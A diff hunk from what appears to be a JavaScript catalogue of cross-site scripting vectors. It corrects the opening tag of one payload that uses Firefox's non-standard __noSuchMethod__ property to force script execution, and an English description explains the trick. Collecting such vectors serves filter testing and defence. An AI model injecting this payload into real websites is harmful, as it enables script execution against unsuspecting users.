@@ -644,7 +644,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '</script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'%js_alert%\')()</script>',
+        'data'       : '<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'%js_alert%\')()</script>',
         'description': {
             'en' : 'Firefox supports the non-standard __noSuchMethod__ property which will be used as an interceptor as soon as a non existing object method is being called. It can be assigned with the Function object to force JavaScript execution without using function(){...}.',
             'ja' : '',
